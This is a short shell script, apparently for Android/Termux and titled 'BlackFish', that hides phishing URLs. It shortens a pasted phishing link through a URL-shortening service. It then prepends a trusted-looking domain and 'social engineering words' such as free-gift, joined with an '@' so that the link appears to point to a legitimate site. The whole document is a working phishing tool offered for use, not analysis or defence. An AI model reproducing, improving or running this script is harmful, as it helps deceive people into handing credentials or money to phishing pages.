#!/system/bin/sh
# Bash Script for Hide Phishing URL Modify by AKSHAY DHAWAN


url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo
echo
echo -e "\e[1;30;46m######______ _            _   ______ _     _ ##### \e[0m" 
echo -e "\e[1;30;46m######| ___ \ |          | |  |  ___(_)   | | ##### \e[0m"
echo -e "\e[1;30;46m######| |_/ / | __ _  ___| | _| |_   _ ___| |__##### \e[0m"
echo -e "\e[1;30;46m######| ___ \ |/ _  |/ __| |/ /  _| | / __| '_ \ ##### \e[0m"
echo -e "\e[1;30;46m######| |_/ / | (_| | (__|   <| |   | \__ \ | | |##### \e[0m"
echo -e "\e[1;30;46m######\____/|_|\__,_|\___|_|\_\_|   |_|___/_| |_|##### \e[0m"
                                           
echo
echo -e "\e[40;38;5;82m For contact \e[30;48;5;82m msg me on this id  \e[0m"
echo -e "\e[30;48;5;82m   Heartily Thanks To \e[40;38;5;82m   My Bro KP & Sameer Khan \e[0m"
echo
echo
echo -e "\e[1;33;46m ### Phishing URL ###\e[0m"
echo
echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
short=$(curl -s https://da.gd/s/?url=${phish})
shorter=${short#https://}
echo
echo -e "\e[1;33;46m ### Masking Domain ###\e[0m"
echo 'Domain to mask the Phishing URL (with http or https), (ex https://google.com, http://anything.org) :'
echo
read mask
url_checker $mask
echo
echo 'Use social engineering words:(like free-gift, free-vides free-rechage)'
echo
echo -e "\e[34mDon't use space just use '-' between social engineering words\e[0m"
echo
read words
echo
echo 'Generating BlackFish Link...'
echo
echo 'Here is the BlackFish URL..'
echo
final=$mask-$words@$shorter
echo $final
